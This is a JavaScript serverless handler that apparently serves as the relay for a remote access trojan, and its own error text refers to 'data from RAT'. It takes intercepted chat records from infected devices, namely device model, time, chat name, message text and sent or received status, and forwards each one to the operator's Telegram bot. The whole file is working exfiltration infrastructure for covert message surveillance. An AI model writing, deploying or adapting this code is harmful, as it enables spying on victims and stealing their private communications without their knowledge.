export default async function handler(request, response) {
    if (request.method !== 'POST') {
        return response.status(405).json({ error: 'Method Not Allowed' });
    }

    const { accessKey, ...data } = request.body;
    const expectedApiKey = process.env.MY_SECRET_API_KEY;
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!expectedApiKey || !botToken || !chatId) {
        return response.status(500).json({ error: 'Server config fucked up' });
    }

    if (accessKey !== expectedApiKey) {
        return response.status(401).json({ error: 'Unauthorized: Invalid Key' });
    }

    const { model, time, type, chat, message } = data;

    if (!model || !time || !type || !chat || !message) {
        return response.status(400).json({ 
            error: 'Incomplete data from RAT. Make sure model, time, type, chat, and message are all being sent.' 
        });
    }

    try {
        let statusBlock;
        if (type.toLowerCase().includes('sent')) {
            statusBlock = '📤 SENT';
        } else {
            statusBlock = '📥 RECEIVED';
        }

        const formattedMessage = `
📱 ${model}
🕚 Time: ${time}

${statusBlock}

Chat: ${chat}
Message: ${message}
        `.trim();

        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        await fetch(telegramApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: formattedMessage,
            }),
        });
        
        return response.status(200).json({ status: 'ok' });
    } catch (error) {
        console.error(error);
        return response.status(500).json({ error: 'Failed to forward data' });
    }
}
